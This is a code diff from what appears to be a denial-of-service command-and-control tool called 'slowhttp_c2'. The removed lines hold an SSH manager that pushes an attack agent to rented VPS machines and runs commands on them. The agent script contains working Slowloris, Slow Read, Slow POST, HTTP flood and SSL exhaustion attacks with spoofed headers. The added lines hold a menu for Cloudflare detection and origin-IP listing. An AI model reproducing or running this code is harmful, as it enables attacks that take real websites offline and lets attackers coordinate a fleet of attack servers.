-            else:
-                return False, "No connection to VPS"
-        
-        # Use lock to prevent concurrent command execution on the same connection
-        with self.connection_locks.get(ip, threading.Lock()):
-            try:
-                # Execute command with timeout
-                cmd_timeout = timeout or self.command_timeout
-                stdin, stdout, stderr = self.connections[ip].exec_command(command, timeout=cmd_timeout)
-                
-                # Wait for command completion
-                exit_status = stdout.channel.recv_exit_status()
-                
-                # Get output and error
-                output = stdout.read().decode('utf-8', errors='ignore').strip()
-                error = stderr.read().decode('utf-8', errors='ignore').strip()
-                
-                if exit_status == 0:
-                    return True, output
-                else:
-                    error_msg = error if error else f"Command failed with exit status {exit_status}"
-                    logger.warning(f"Command failed on {ip}: {error_msg}")
-                    return False, error_msg
-                    
-            except Exception as e:
-                logger.error(f"Command execution error on {ip}: {str(e)}")
-                
-                # Connection might be broken, remove it
-                if ip in self.connections:
-                    try:
-                        self.connections[ip].close()
-                    except:
-                        pass
-                    del self.connections[ip]
-                
-                # Try to reconnect and execute again if auto_reconnect is enabled
-                if auto_reconnect:
-                    logger.info(f"Command failed on {ip}, attempting reconnect and retry...")
-                    success, message = self.reconnect_vps(ip)
-                    if success:
-                        return self.execute_command(ip, command, timeout, auto_reconnect=False)
-                    else:
-                        return False, f"Reconnection failed: {message}"
-                
-                return False, str(e)
-    
-    def execute_command_async(self, ip, command):
-        """Execute command asynchronously without waiting for completion"""
-        if not SSH_AVAILABLE:
-            return False, "SSH functionality not available (paramiko module missing)"
-            
-        if ip not in self.connections or not self._check_connection_alive(ip):
-            success, message = self.reconnect_vps(ip)
-            if not success:
-                return False, f"Reconnection failed: {message}"
-        
-        try:
-            # Execute command without waiting for completion
-            self.connections[ip].exec_command(f"nohup {command} > /dev/null 2>&1 &")
-            return True, "Command launched asynchronously"
-        except Exception as e:
-            logger.error(f"Async command execution error on {ip}: {str(e)}")
-            return False, str(e)
-    
-    def get_system_info(self, ip):
-        """Get detailed system information from VPS"""
-        if not self._check_connection_alive(ip):
-            success, message = self.reconnect_vps(ip)
-            if not success:
-                return {}
-        
-        system_info = {}
-        commands = {
-            "os": "cat /etc/os-release | grep PRETTY_NAME | cut -d '&quot;' -f 2",
-            "kernel": "uname -r",
-            "cpu": "cat /proc/cpuinfo | grep 'model name' | head -1 | cut -d ':' -f 2",
-            "cpu_cores": "nproc",
-            "memory": "free -m | grep Mem | awk '{print $2}'",
-            "disk": "df -h / | tail -1 | awk '{print $2}'",
-            "python_version": "python3 --version 2>&1 || python --version 2>&1",
-            "uptime": "uptime -p",
-            "hostname": "hostname",
-            "network": "ip -o -4 addr show | awk '{print $2,$4}' | grep -v 'lo'",
-            "load": "cat /proc/loadavg | awk '{print $1,$2,$3}'",
-            "docker": "which docker > /dev/null 2>&1 && echo 'Available' || echo 'Not installed'"
-        }
-        
-        for key, cmd in commands.items():
-            success, output = self.execute_command(ip, cmd, timeout=10)
-            if success:
-                system_info[key] = output.strip()
-            else:
-                system_info[key] = "Unknown"
-        
-        return system_info
-    
-    def check_agent_status(self, ip):
-        """Check if attack agent is running on VPS"""
-        if not self._check_connection_alive(ip):
-            success, message = self.reconnect_vps(ip)
-            if not success:
-                return {"status": "unknown", "error": message}
-        
-        # Check for running agent processes
-        success, output = self.execute_command(ip, "ps aux | grep 'python.*agent.py' | grep -v grep | wc -l")
-        if not success:
-            return {"status": "unknown", "error": output}
-        
-        process_count = int(output.strip()) if output.strip().isdigit() else 0
-        
-        if process_count > 0:
-            # Get process details
-            success, details = self.execute_command(ip, "ps aux | grep 'python.*agent.py' | grep -v grep | head -1")
-            
-            # Check status file if it exists
-            success, status_file = self.execute_command(ip, "cat /tmp/slowhttp_c2/status.json 2>/dev/null || echo '{}'")
-            try:
-                status_data = json.loads(status_file)
-            except:
-                status_data = {}
-            
-            return {
-                "status": "running",
-                "processes": process_count,
-                "details": details.strip() if success else "",
-                "stats": status_data
-            }
-        else:
-            return {"status": "stopped", "processes": 0}
-    
-    def deploy_agent(self, ip, agent_type="standard"):
-        """Deploy attack agent to VPS with improved security and error handling"""
-        if not SSH_AVAILABLE:
-            return False, "SSH functionality not available (paramiko module missing)"
-            
-        # Select agent script based on type
-        if agent_type == "advanced":
-            agent_script = self._get_advanced_agent_script()
-        else:
-            agent_script = self._get_standard_agent_script()
-        
-        # Use proper file transfer method
-        commands = [
-            "mkdir -p /tmp/slowhttp_c2",
-            "rm -f /tmp/slowhttp_c2/agent.py"  # Clean old version
-        ]
-        
-        # Execute setup commands
-        for cmd in commands:
-            success, output = self.execute_command(ip, cmd)
-            if not success:
-                return False, f"Setup failed: {output}"
-        
-        # Transfer file using SFTP instead of base64 encoding
-        try:
-            if ip in self.connections:
-                sftp = self.connections[ip].open_sftp()
-                
-                # Write agent script to temporary local file
-                temp_file = f"/tmp/agent_{ip.replace('.','_')}.py"
-                with open(temp_file, 'w') as f:
-                    f.write(agent_script)
-                
-                # Upload via SFTP
-                sftp.put(temp_file, '/tmp/slowhttp_c2/agent.py')
-                sftp.close()
-                
-                # Clean up local temp file
-                os.remove(temp_file)
-                
-                logger.info(f"Agent deployed to {ip} via SFTP")
-            else:
-                logger.warning(f"No SSH connection available for {ip}, using base64 fallback")
-                # Fallback to base64 method if SFTP fails
-                encoded_script = base64.b64encode(agent_script.encode()).decode()
-                cmd = f"echo '{encoded_script}' | base64 -d > /tmp/slowhttp_c2/agent.py"
-                success, output = self.execute_command(ip, cmd)
-                if not success:
-                    return False, f"File transfer failed: {output}"
-        
-        except Exception as e:
-            logger.error(f"SFTP transfer failed for {ip}: {str(e)}")
-            # Fallback to base64 method if SFTP fails
-            encoded_script = base64.b64encode(agent_script.encode()).decode()
-            cmd = f"echo '{encoded_script}' | base64 -d > /tmp/slowhttp_c2/agent.py"
-            success, output = self.execute_command(ip, cmd)
-            if not success:
-                return False, f"File transfer failed: {output}"
-        
-        # Set permissions and test
-        final_commands = [
-            "chmod +x /tmp/slowhttp_c2/agent.py",
-            "python3 -m py_compile /tmp/slowhttp_c2/agent.py",  # Compile to check syntax
-            "python3 /tmp/slowhttp_c2/agent.py --help | head -5"  # Test execution
-        ]
-        
-        for i, cmd in enumerate(final_commands):
-            success, output = self.execute_command(ip, cmd, timeout=20)
-            if not success:
-                return False, f"Final step {i+1} failed: {output}"
-        
-        return True, "Agent deployed and tested successfully"
-    
-    def _get_standard_agent_script(self):
-        """Get the standard agent script"""
-        return '''#!/usr/bin/env python3
-import socket,threading,time,sys,random,string,signal,argparse,os,logging
-from urllib.parse import urlparse
-import json
-
-# Configure logging
-logging.basicConfig(
-    level=logging.INFO,
-    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
-    filename='/tmp/slowhttp_agent.log',
-    filemode='a'
-)
-logger = logging.getLogger("SlowHTTP-Agent")
-
-class SlowHTTPAttack:
-    def __init__(self,host,port=80):
-        self.host,self.port,self.conns,self.running=host,port,[],False
-        self.stats={'sent':0,'errors':0,'active':0,'bytes_sent':0}
-        self.lock = threading.Lock()
-        self.start_time = time.time()
-    
-    def create_socket(self):
-        try:
-            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-            s.settimeout(15)
-            s.connect((self.host,self.port))
-            return s
-        except Exception as e:
-            with self.lock:
-                self.stats['errors']+=1
-            return None
-    
-    def slowloris_attack(self,num_conns=100,delay=15,duration=0):
-        logger.info(f"Starting Slowloris attack on {self.host}:{self.port}")
-        logger.info(f"Connections: {num_conns}, Delay: {delay}s, Duration: {'unlimited' if duration==0 else f'{duration}s'}")
-        
-        self.running=True
-        self.start_time=time.time()
-        
-        # Create initial connections
-        logger.info("Creating initial connections...")
-        for i in range(num_conns):
-            if not self.running:
-                break
-            
-            sock=self.create_socket()
-            if sock:
-                try:
-                    # Full HTTP request with multiple headers for maximum server load
-                    request = f"GET /?slowloris={random.randint(100000,999999)}&cache={time.time()} HTTP/1.1\\r\\n"
-                    request += f"Host: {self.host}\\r\\n"
-                    request += f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\\r\\n"
-                    request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\\r\\n"
-                    request += "Accept-Language: en-US,en;q=0.9,es;q=0.8,fr;q=0.7\\r\\n"
-                    request += "Accept-Encoding: gzip, deflate\\r\\n"
-                    request += "Cache-Control: no-cache\\r\\n"
-                    request += "Pragma: no-cache\\r\\n"
-                    request += "Connection: keep-alive\\r\\n"
-                    request += "Upgrade-Insecure-Requests: 1\\r\\n"
-                    
-                    # Convert escape sequences to actual bytes
-                    request_bytes = request.encode().decode('unicode_escape').encode()
-                    
-                    sock.send(request_bytes)
-                    self.conns.append(sock)
-                    
-                    with self.lock:
-                        self.stats['sent']+=1
-                        self.stats['bytes_sent'] += len(request_bytes)
-                    
-                    if (i+1) % 100 == 0:
-                        logger.info(f"{i+1}/{num_conns} connections created")
-                        
-                except Exception as e:
-                    with self.lock:
-                        self.stats['errors']+=1
-                    try:
-                        sock.close()
-                    except:
-                        pass
-            
-            # Small delay to avoid overwhelming local resources
-            if i % 100 == 0:
-                time.sleep(0.1)
-        
-        with self.lock:
-            self.stats['active']=len(self.conns)
-        logger.info(f"Initial connections complete. Active: {len(self.conns)}")
-        
-        if not self.conns:
-            logger.error("No connections established, aborting attack")
+        domain = self.terminal.input_with_prompt("Enter domain name: ")
+        if not domain:
             return
         
-        # Keep connections alive phase
-        logger.info("Starting keep-alive phase...")
-        cycle_count=0
+        # Remove protocol if present
+        if domain.startswith('http'):
+            parsed = urlparse(domain)
+            domain = parsed.hostname or parsed.netloc
         
-        while self.running and self.conns:
-            # Check duration limit
-            if duration > 0 and (time.time() - self.start_time) >= duration:
-                logger.info("Time limit reached, stopping attack...")
-                break
-            
-            cycle_count+=1
-            active_before=len(self.conns)
-            
-            # Send headers to keep connections alive
-            failed_socks = []
-            headers_per_cycle = random.randint(1, 3)  # Multiple headers per cycle
-            
-            for sock in self.conns:
-                try:
-                    # Send multiple headers to increase server load
-                    for _ in range(headers_per_cycle):
-                        header_name=''.join(random.choice(string.ascii_letters) for _ in range(random.randint(10,20)))
-                        header_value=''.join(random.choice(string.ascii_letters+string.digits+'-_.') for _ in range(random.randint(20,50)))
-                        header = f"X-{header_name}: {header_value}\\r\\n"
-                        header_bytes = header.encode().decode('unicode_escape').encode()
-                        
-                        sock.send(header_bytes)
-                        with self.lock:
-                            self.stats['sent']+=1
-                            self.stats['bytes_sent'] += len(header_bytes)
-                    
-                except Exception:
-                    failed_socks.append(sock)
-                    with self.lock:
-                        self.stats['errors']+=1
-            
-            # Remove failed connections
-            for sock in failed_socks:
-                if sock in self.conns:
-                    self.conns.remove(sock)
-                try:
-                    sock.close()
-                except:
-                    pass
-                
-                # Try to replace lost connections
-                new_sock=self.create_socket()
-                if new_sock:
-                    try:
-                        # Full request with randomization
-                        req = f"GET /?session={random.randint(100000,999999)}&attempt=1 HTTP/1.1\\r\\n"
-                        req += f"Host: {self.host}\\r\\n"
-                        req += f"User-Agent: SlowHTTP-Agent-{random.randint(1000,9999)}\\r\\n"
-                        req += "Connection: keep-alive\\r\\n"
-                        req += f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}\\r\\n"
-                        req_bytes = req.encode().decode('unicode_escape').encode()
-                        
-                        new_sock.send(req_bytes)
-                        self.conns.append(new_sock)
-                        with self.lock:
-                            self.stats['sent']+=1
-                            self.stats['bytes_sent'] += len(req_bytes)
-                    except Exception:
-                        try:
-                            new_sock.close()
-                        except:
-                            pass
-            
-            with self.lock:
-                self.stats['active']=len(self.conns)
-                active_after=len(self.conns)
-                sent = self.stats['sent']
-                errors = self.stats['errors']
-                bytes_sent = self.stats['bytes_sent']
-            
-            # Calculate and log metrics
-            elapsed = time.time() - self.start_time
-            mb_sent = bytes_sent / (1024 * 1024)
-            
-            logger.info(f"Cycle {cycle_count} | Active: {active_after} | Headers: {sent} | Errors: {errors} | Data: {mb_sent:.2f} MB | Uptime: {int(elapsed)}s")
-            
-            # Write status file for monitoring
-            self.write_status_file()
-            
-            # Delay before next cycle
-            time.sleep(delay)
-    
-    def slow_read_attack(self, num_conns=50, delay=10, duration=0):
-        """Execute a Slow Read attack"""
-        logger.info(f"Starting Slow Read attack on {self.host}:{self.port}")
-        logger.info(f"Connections: {num_conns}, Delay: {delay}s, Duration: {'unlimited' if duration==0 else f'{duration}s'}")
+        print(f"\n{Colors.YELLOW}[INFO] Detecting Cloudflare protection for {domain}...{Colors.RESET}")
         
-        self.running=True
-        self.start_time=time.time()
-        
-        while time.time() - self.start_time < duration and self.running:
-            try:
-                s = self.create_socket()
-                if s:
-                    # Send a complete HTTP request but read the response very slowly
-                    user_agent = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(70,110)}.0.{random.randint(1000,9999)}.{random.randint(10,999)}"
-                    http_request = (
-                        f"GET /?id={random.randint(1000,9999)}&t={time.time()} HTTP/1.1\\r\\n"
-                        f"Host: {self.host}\\r\\n"
-                        f"User-Agent: {user_agent}\\r\\n"
-                        f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n"
-                        f"Accept-Language: en-US,en;q=0.5\\r\\n"
-                        f"Accept-Encoding: gzip, deflate\\r\\n"
-                        f"Connection: keep-alive\\r\\n"
-                        f"Cache-Control: no-cache\\r\\n\\r\\n"
-                    )
-                    
-                    request_bytes = http_request.encode().decode('unicode_escape').encode()
-                    s.send(request_bytes)
-                    
-                    with self.lock:
-                        self.stats['active'] += 1
-                        self.stats['sent'] += 1
-                        self.stats['bytes_sent'] += len(request_bytes)
-                    
-                    # Read response very slowly, 1 byte at a time with delays
-                    while self.running:
-                        try:
-                            s.recv(1)
-                            time.sleep(delay)
-                        except:
-                            break
-                    
-                    try:
-                        s.close()
-                        with self.lock:
-                            self.stats['active'] -= 1
-                    except:
-                        pass
-            except Exception as e:
-                logger.debug(f"Error in Slow Read attack: {e}")
-                with self.lock:
-                    self.stats['errors'] += 1
-            
-            # Write status file for monitoring
-            self.write_status_file()
-            
-            # Small delay before creating a new connection
-            time.sleep(1)
-    
-    def slow_post_attack(self,num_conns=50,delay=10,duration=0):
-        logger.info(f"Starting Slow POST attack on {self.host}:{self.port}")
-        logger.info(f"Connections: {num_conns}, Delay: {delay}s, Duration: {'unlimited' if duration==0 else f'{duration}s'}")
-        
-        self.running=True
-        self.start_time=time.time()
-        
-        def post_worker(worker_id):
-            sock=self.create_socket()
-            if not sock:
-                logger.warning(f"Worker {worker_id}: Failed to connect")
-                return
-            
-            try:
-                # Large content-length
-                content_length=random.randint(1000000,10000000)  # 1MB to 10MB range
-                
-                # Proper HTTP POST format
-                post_request = f"POST /form{worker_id}?data=large HTTP/1.1\\r\\n"
-                post_request += f"Host: {self.host}\\r\\n"
-                post_request += "Content-Type: application/x-www-form-urlencoded\\r\\n"
-                post_request += f"Content-Length: {content_length}\\r\\n"
-                post_request += "Connection: keep-alive\\r\\n"
-                post_request += "Expect: 100-continue\\r\\n"  # Forces server to wait
-                post_request += "\\r\\n"  # End of headers
-                
-                # Convert escape sequences properly
-                post_bytes = post_request.encode().decode('unicode_escape').encode()
-                
-                sock.send(post_bytes)
-                with self.lock:
-                    self.stats['sent']+=1
-                    self.stats['bytes_sent'] += len(post_bytes)
-                    
-                logger.info(f"Worker {worker_id}: POST headers sent, content-length: {content_length:,} bytes")
-                
-                # Send POST data extremely slowly
-                bytes_sent=0
-                chunk_sizes=[1,2,3,4,5,8,10]  # Variable chunk sizes
-                
-                while self.running and bytes_sent < content_length:
-                    # Check duration limit
-                    if duration > 0 and (time.time() - self.start_time) >= duration:
-                        logger.info(f"Worker {worker_id}: Duration limit reached")
-                        break
-                    
-                    # Variable chunk size for unpredictability
-                    chunk_size = random.choice(chunk_sizes)
-                    remaining = min(chunk_size, content_length - bytes_sent)
-                    
-                    # Generate data chunk
-                    data=''.join(random.choice(string.ascii_letters+string.digits+'=&') for _ in range(remaining))
-                    
-                    try:
-                        sock.send(data.encode())
-                        bytes_sent += remaining
-                        with self.lock:
-                            self.stats['sent'] += remaining
-                            self.stats['bytes_sent'] += remaining
-                    except Exception:
-                        logger.warning(f"Worker {worker_id}: Connection lost at {bytes_sent:,} bytes")
-                        break
-                    
-                    # Progress report every 100KB
-                    if bytes_sent % 100000 == 0:
-                        progress = (bytes_sent/content_length)*100
-                        logger.info(f"Worker {worker_id}: Progress: {bytes_sent:,}/{content_length:,} ({progress:.1f}%)")
-                        
-                        # Update status file
-                        self.write_status_file()
-                    
-                    # Slow transmission
-                    time.sleep(delay)
-                
-                logger.info(f"Worker {worker_id}: Completed: {bytes_sent:,} bytes sent")
-                
-            except Exception as e:
-                logger.error(f"Worker {worker_id}: Error: {str(e)}")
-                with self.lock:
-                    self.stats['errors']+=1
-            finally:
-                try:
-                    sock.close()
-                except:
-                    pass
-        
-        # Start worker threads
-        threads=[]
-        logger.info(f"Starting {num_conns} worker threads...")
-        
-        for i in range(num_conns):
-            if not self.running:
-                break
-            thread = threading.Thread(target=post_worker, args=(i+1,), daemon=True)
-            thread.start()
-            threads.append(thread)
-            logger.info(f"Thread {i+1}: Worker started")
-            time.sleep(0.1)  # Small stagger to avoid overwhelming
-        
-        # Monitor all threads
-        while self.running:
-            if duration > 0 and (time.time() - self.start_time) >= duration:
-                logger.info("Duration limit reached, stopping...")
-                self.running = False
-                break
-            
-            # Count active threads
-            active_threads = sum(1 for t in threads if t.is_alive())
-            
-            with self.lock:
-                sent = self.stats['sent']
-                errors = self.stats['errors']
-                bytes_sent = self.stats['bytes_sent']
-            
-            # Calculate metrics
-            elapsed = time.time() - self.start_time
-            mb_sent = bytes_sent / (1024 * 1024)
-            
-            logger.info(f"STATUS: Active workers: {active_threads}/{num_conns} | Data sent: {mb_sent:.2f} MB | Errors: {errors} | Uptime: {int(elapsed)}s")
-            
-            # Write status file
-            self.write_status_file()
-            
-            if active_threads == 0:
-                logger.info("All workers completed")
-                break
-            
-            time.sleep(10)  # Status update interval
-    
-    def http_flood_attack(self, num_conns=100, requests_per_conn=100, duration=0):
-        """Execute an HTTP Flood attack"""
-        logger.info(f"Starting HTTP Flood attack on {self.host}:{self.port}")
-        logger.info(f"Connections: {num_conns}, Requests per connection: {requests_per_conn}, Duration: {'unlimited' if duration==0 else f'{duration}s'}")
-        
-        self.running = True
-        self.start_time = time.time()
-        
-        def flood_worker(worker_id):
-            """Worker thread for HTTP flooding"""
-            requests_sent = 0
-            errors = 0
-            
-            while self.running and (requests_sent < requests_per_conn or requests_per_conn == 0):
-                # Check duration limit
-                if duration > 0 and (time.time() - self.start_time) >= duration:
-                    logger.info(f"Worker {worker_id}: Duration limit reached")
-                    break
-                
-                # Create a new socket for each request
-                sock = self.create_socket()
-                if not sock:
-                    errors += 1
-                    time.sleep(0.1)
-                    continue
-                
-                try:
-                    # Generate random path and query parameters
-                    path = random.choice(["/", "/index.html", "/home", "/about", "/contact", "/products", "/services"])
-                    query = f"?id={random.randint(1000,9999)}&t={time.time()}&r={random.random()}"
-                    
-                    # Random user agent
-                    user_agents = [
-                        f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(70,110)}.0.{random.randint(1000,9999)}.{random.randint(10,999)}",
-                        f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_{random.randint(10,15)}_{random.randint(1,7)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(70,110)}.0.{random.randint(1000,9999)}.{random.randint(10,999)}",
-                        f"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:{random.randint(60,110)}.0) Gecko/20100101 Firefox/{random.randint(60,110)}.0",
-                        f"Mozilla/5.0 (iPhone; CPU iPhone OS {random.randint(10,15)}_{random.randint(0,6)} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{random.randint(10,15)}.0 Mobile/15E148 Safari/604.1"
-                    ]
-                    user_agent = random.choice(user_agents)
-                    
-                    # Build HTTP request
-                    http_request = (
-                        f"GET {path}{query} HTTP/1.1\\r\\n"
-                        f"Host: {self.host}\\r\\n"
-                        f"User-Agent: {user_agent}\\r\\n"
-                        f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\\r\\n"
-                        f"Accept-Language: en-US,en;q=0.5\\r\\n"
-                        f"Accept-Encoding: gzip, deflate\\r\\n"
-                        f"Connection: close\\r\\n"  # Use 'close' to free up connections
-                        f"Cache-Control: no-cache\\r\\n"
-                        f"Pragma: no-cache\\r\\n\\r\\n"
-                    )
-                    
-                    request_bytes = http_request.encode().decode('unicode_escape').encode()
-                    sock.send(request_bytes)
-                    
-                    with self.lock:
-                        self.stats['sent'] += 1
-                        self.stats['bytes_sent'] += len(request_bytes)
-                    
-                    requests_sent += 1
-                    
-                    # Optionally read the response
-                    try:
-                        sock.settimeout(2)  # Short timeout for reading response
-                        sock.recv(1024)  # Read some of the response
-                    except:
-                        pass
-                    
-                except Exception as e:
-                    errors += 1
-                    with self.lock:
-                        self.stats['errors'] += 1
-                
-                finally:
-                    try:
-                        sock.close()
-                    except:
-                        pass
-                
-                # Small delay between requests
-                time.sleep(0.01)
-            
-            logger.info(f"Worker {worker_id}: Completed {requests_sent} requests with {errors} errors")
-        
-        # Start worker threads
-        threads = []
-        for i in range(num_conns):
-            if not self.running:
-                break
-            thread = threading.Thread(target=flood_worker, args=(i+1,), daemon=True)
-            thread.start()
-            threads.append(thread)
-            
-            # Stagger thread starts
-            if i % 10 == 0:
-                time.sleep(0.1)
-        
-        # Monitor threads
-        while self.running:
-            if duration > 0 and (time.time() - self.start_time) >= duration:
-                logger.info("Duration limit reached, stopping...")
-                self.running = False
-                break
-            
-            # Count active threads
-            active_threads = sum(1 for t in threads if t.is_alive())
-            
-            with self.lock:
-                sent = self.stats['sent']
-                errors = self.stats['errors']
-                bytes_sent = self.stats['bytes_sent']
-            
-            # Calculate metrics
-            elapsed = time.time() - self.start_time
-            mb_sent = bytes_sent / (1024 * 1024)
-            rps = sent / elapsed if elapsed > 0 else 0
-            
-            logger.info(f"HTTP Flood: Active threads: {active_threads}/{num_conns} | Requests: {sent} | RPS: {rps:.2f} | Data: {mb_sent:.2f} MB | Errors: {errors}")
-            
-            # Write status file
-            self.write_status_file()
-            
-            if active_threads == 0:
-                logger.info("All workers completed")
-                break
-            
-            time.sleep(5)
-    
-    def ssl_exhaust_attack(self, num_conns=50, duration=0):
-        """Execute an SSL/TLS exhaustion attack"""
-        logger.info(f"Starting SSL/TLS exhaustion attack on {self.host}:{self.port}")
-        logger.info(f"Connections: {num_conns}, Duration: {'unlimited' if duration==0 else f'{duration}s'}")
-        
-        self.running = True
-        self.start_time = time.time()
-        
-        def ssl_worker(worker_id):
-            """Worker thread for SSL exhaustion"""
-            connections_made = 0
-            errors = 0
-            
-            while self.running:
-                # Check duration limit
-                if duration > 0 and (time.time() - self.start_time) >= duration:
-                    logger.info(f"Worker {worker_id}: Duration limit reached")
-                    break
-                
-                try:
-                    # Create raw socket
-                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    sock.settimeout(10)
-                    sock.connect((self.host, self.port))
-                    
-                    # Send SSL/TLS Client Hello but don't complete handshake
-                    # This is a simplified version - in reality, you'd need to craft a proper TLS handshake
-                    client_hello = b"\\x16\\x03\\x01\\x00\\xdc\\x01\\x00\\x00\\xd8\\x03\\x03"
-                    sock.send(client_hello)
-                    
-                    with self.lock:
-                        self.stats['sent'] += 1
-                        self.stats['bytes_sent'] += len(client_hello)
-                        self.stats['active'] += 1
-                    
-                    connections_made += 1
-                    
-                    # Keep the connection open without completing handshake
-                    time.sleep(random.uniform(1, 5))
-                    
-                except Exception as e:
-                    errors += 1
-                    with self.lock:
-                        self.stats['errors'] += 1
-                
-                finally:
-                    try:
-                        sock.close()
-                        with self.lock:
-                            self.stats['active'] -= 1
-                    except:
-                        pass
-                
-                # Small delay between connection attempts
-                time.sleep(0.1)
-            
-            logger.info(f"Worker {worker_id}: Made {connections_made} SSL connection attempts with {errors} errors")
-        
-        # Start worker threads
-        threads = []
-        for i in range(num_conns):
-            if not self.running:
-                break
-            thread = threading.Thread(target=ssl_worker, args=(i+1,), daemon=True)
-            thread.start()
-            threads.append(thread)
-            
-            # Stagger thread starts
-            if i % 5 == 0:
-                time.sleep(0.2)
-        
-        # Monitor threads
-        while self.running:
-            if duration > 0 and (time.time() - self.start_time) >= duration:
-                logger.info("Duration limit reached, stopping...")
-                self.running = False
-                break
-            
-            # Count active threads
-            active_threads = sum(1 for t in threads if t.is_alive())
-            
-            with self.lock:
-                sent = self.stats['sent']
-                active = self.stats['active']
-                errors = self.stats['errors']
-            
-            # Calculate metrics
-            elapsed = time.time() - self.start_time
-            
-            logger.info(f"SSL Exhaust: Active threads: {active_threads}/{num_conns} | Connections: {sent} | Active: {active} | Errors: {errors} | Uptime: {int(elapsed)}s")
-            
-            # Write status file
-            self.write_status_file()
-            
-            if active_threads == 0:
-                logger.info("All workers completed")
-                break
-            
-            time.sleep(5)
-    
-    def write_status_file(self):
-        """Write status to file for monitoring"""
         try:
-            status_dir = "/tmp/slowhttp_c2"
-            os.makedirs(status_dir, exist_ok=True)
+            results = self.network_tools.detect_cloudflare(domain)
             
-            with self.lock:
-                status = {
-                    'active': self.stats['active'],
-                    'sent': self.stats['sent'],
-                    'errors': self.stats['errors'],
-                    'bytes_sent': self.stats['bytes_sent'],
-                    'uptime': int(time.time() - self.start_time),
-                    'timestamp': time.time()
-                }
+            if results['is_behind_cloudflare']:
+                print(f"\n{Colors.GREEN}[DETECTED] Domain is protected by Cloudflare{Colors.RESET}")
+                
+                print(f"\n{Colors.BOLD}DETECTION EVIDENCE:{Colors.RESET}")
+                for evidence in results['evidence']:
+                    print(f"  - {evidence}")
+                
+                if results['cloudflare_ips']:
+                    print(f"\n{Colors.BOLD}CLOUDFLARE IPs:{Colors.RESET}")
+                    for ip in results['cloudflare_ips']:
+                        print(f"  - {ip}")
+                
+                if results['direct_ips']:
+                    print(f"\n{Colors.BOLD}ALL RESOLVED IPs:{Colors.RESET}")
+                    for ip in results['direct_ips']:
+                        print(f"  - {ip}")
+            else:
+                print(f"\n{Colors.YELLOW}[RESULT] Domain does not appear to be behind Cloudflare{Colors.RESET}")
+                
+                if results['direct_ips']:
+                    print(f"\n{Colors.BOLD}RESOLVED IPs:{Colors.RESET}")
+                    for ip in results['direct_ips']:
+                        print(f"  - {ip}")
             
-            with open(f"{status_dir}/status.json", 'w') as f:
-                json.dump(status, f)
         except Exception as e:
-            logger.error(f"Failed to write status file: {str(e)}")
-    
-    def stop_attack(self):
-        logger.info("Stopping attack...")
-        self.running=False
+            print(f"{Colors.RED}[ERROR] {str(e)}{Colors.RESET}")
+            logger.error(f"Error in Cloudflare detection: {str(e)}")
+            logger.error(traceback.format_exc())
         
-        # Close all connections
-        for sock in self.conns[:]:
-            try:
-                sock.close()
-            except:
-                pass
-        self.conns.clear()
-        logger.info("Attack stopped")
-
-# Better signal handling
-attacker = None
-
-def signal_handler(sig,frame):
-    global attacker
-    logger.info("Received interrupt signal")
-    if attacker:
-        attacker.stop_attack()
-    logger.info("Shutting down...")
-    sys.exit(0)
+        input("\nPress Enter to continue...")
+    
+    def ssl_info_tool(self):
+        """SSL information tool"""
+        self.terminal.clear_screen()
+        print(f"{Colors.BOLD}SSL INFORMATION TOOL{Colors.RESET}")
+        print("=" * 50)
+        
+        target = self.terminal.input_with_prompt("Enter target host: ")
+        if not target:
+            return
+        
+        # Parse URL if provided
+        if target.startswith('http'):
+            parsed = urlparse(target)
+            target = parsed.hostname or parsed.netloc
+        
+        port = self.terminal.input_with_prompt("Enter port [443]: ", False) or "443"
+        try:
+            port = int(port)
+        except ValueError:
+            print(f"{Colors.RED}Invalid port number{Colors.RESET}")
+            input("Press Enter to continue...")
+            return
+        
+        print(f"\n{Colors.YELLOW}[INFO] Getting SSL information for {target}:{port}...{Colors.RESET}")
+        
+        try:
+            results = self.network_tools.get_ssl_info(target, port)
+            
+            if results['has_ssl']:
+                print(f"\n{Colors.GREEN}[SUCCESS] SSL/TLS connection established{Colors.RESET}")
+                
+                print(f"\n{Colors.BOLD}CERTIFICATE INFORMATION:{Colors.RESET}")
+                print(f"Subject: {results['subject']}")
+                print(f"Issuer: {results['issuer']}")
+                print(f"Version: {results['version']}")
+                print(f"Serial Number: {results['serial_number']}")
+                print(f"Not Before: {results['not_before']}")
+                print(f"Not After: {results['not_after']}")
+                
+                # Check expiration
+                if results['is_expired']:
+                    print(f"{Colors.RED}[WARNING] Certificate has expired!{Colors.RESET}")
+                else:
+                    days_left = results['days_left']
+                    if days_left < 30:
+                        print(f"{Colors.YELLOW}[WARNING] Certificate expires in {days_left} days{Colors.RESET}")
+                    else:
+                        print(f"{Colors.GREEN}Certificate valid for {days_left} more days{Colors.RESET}")
+                
+                print(f"\n{Colors.BOLD}SUPPORTED PROTOCOLS:{Colors.RESET}")
+                for protocol, supported in results['protocols'].items():
+                    status = f"{Colors.GREEN}Supported{Colors.RESET}" if supported else f"{Colors.RED}Not Supported{Colors.RESET}"
+                    print(f"{protocol}: {status}")
+                
+                print(f"\n{Colors.BOLD}CIPHER SUITES:{Colors.RESET}")
+                for cipher in results['cipher_suites'][:5]:  # Show only first 5
+                    print(f"  - {cipher}")
+                
+                if len(results['cipher_suites']) > 5:
+                    print(f"  ... and {len(results['cipher_suites']) - 5} more")
+                
+                # Security assessment
+                print(f"\n{Colors.BOLD}SECURITY ASSESSMENT:{Colors.RESET}")
